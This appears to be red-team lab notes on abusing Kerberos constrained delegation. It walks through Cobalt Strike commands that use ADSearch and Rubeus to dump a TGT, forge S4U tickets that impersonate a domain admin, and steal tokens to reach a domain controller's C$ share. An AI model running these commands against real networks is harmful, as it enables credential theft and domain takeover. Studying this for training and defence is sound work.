# Constrained Delegation



## Introduction

Constrained delegation is a safer means for services to perform delegation. Constrained delegation aims to restrict the services to which the server can act on behalf of the user. It no longer allows the server to cache TGTs of other users. But it does allow it to request a TGS for another user (using it's own TGT).

**Scope of Trust:** Constrained delegation allows a service to impersonate a user only for specific services.

**Usage:** Typically used in scenarios where a service needs to access another service on behalf of the user (example: web server interacting with database)

**Configuration:** This is set up on the service account level in Active Directory. You specify which target services the account can delegate to.

## Enumerate hosts configured for constrained delegation

```sh
beacon> execute-assembly C:\ToolsADSearch.exe --search 
"(&(objectCategory=computer)(msds-allowedtodelegateto=*))" 
--attributes dnshostname,samaccountname,msds-allowedtodelegateto --json

[*] TOTAL NUMBER OF SEARCH RESULTS: 1
msds-allowedtodelegateto (what we're looking for)
...
```



## Perform Delegation

To perform the delegation, we need the TGT of the principal (computer or user) trusted for delegation.  The most direct way is to extract it with Rubeus `dump`:

<mark style="color:yellow;">**Technique**</mark>:   We can also request one with Rubeus `asktgt` if you have NTLM or AES hashes.



### Dump TGT

```sh
beacon> run hostname
sql-2

beacon> getuid
[*] You are NT AUTHORITY\SYSTEM (admin)

beacon> execute-assembly C:\Tools\Rubeus.exe triage
 --------------------------------------------------------------------------------------------------------------- 
 | LUID    | UserName                    | Service                                       | EndTime              |
 --------------------------------------------------------------------------------------------------------------- 
  (LUID is what we need)                  (We what the LUID for krbtgt service)
  
beacon> execute-assembly C:\Tools\Rubeus.exe dump /luid:0x3e4 /service:krbtgt /nowrap

```

### Get TGT

With the TGT, perform an S4U request to obtain a usable TGS. We want someone who we know to be a local admin on the target.  In this case, a domain admin makes the most sense.

This will perform an S4U2Self first and then an S4U2Proxy.&#x20;

```sh
beacon> execute-assembly C:\Tools\Rubeus\Rubeus.exe s4u 
/impersonateuser:cfoxy /msdsspn:cifs/dc-2.rotta.lab 
/user:sql-2$ /ticket:<ticket-from-dump> /nowrap

[*] Action: S4U

Success!
```

where:

* `/impersonateuser` is the user we want to impersonate. MUST BE LOCAL DOMAIN ADMIN to the host.
* `/msdsspn` is the service principal name that SQL-2 is allowed to delegate to.
* `/user` is the principal allowed to perform the delegation that we dumped a ticket for.
* `/ticket` is the TGT for `/user`.

### Create New Login Session

<mark style="color:red;">**Note**</mark>**:** Make sure to always use the FQDN. Otherwise, you will see 1326 errors.

```sh
beacon> execute-assembly C:\Tools\Rubeus.exe createnetonly 
/program:C:\Windows\System32\cmd.exe /domain:ROTTA /username:cfoxy /password:Password123! /ticket:<ticket>

beacon> steal_token 5540

beacon> ls \\dc-2.rotta.lab\c$
```

##

## Alternate Service Name

## Rubeus /altservice

```sh
beacon> execute-assembly C:\Tools\Rubeus.exe s4u /impersonateuser:cfoxy 
/msdsspn:cifs/dc-2.rotta.lab /altservice:ldap /user:sql-2$ /ticket:<ticket> /nowrap

[*] Action: S4U

...


beacon> execute-assembly C:\Tools\Rubeus.exe createnetonly /program:C:\Windows\System32\cmd.exe /domain:ROTTA /username:cfoxy 
/password:Password123! /ticket:<ticket>

[+] ProcessID       : 2580
[+] Ticket successfully imported!

...

beacon> steal_token 2580
```
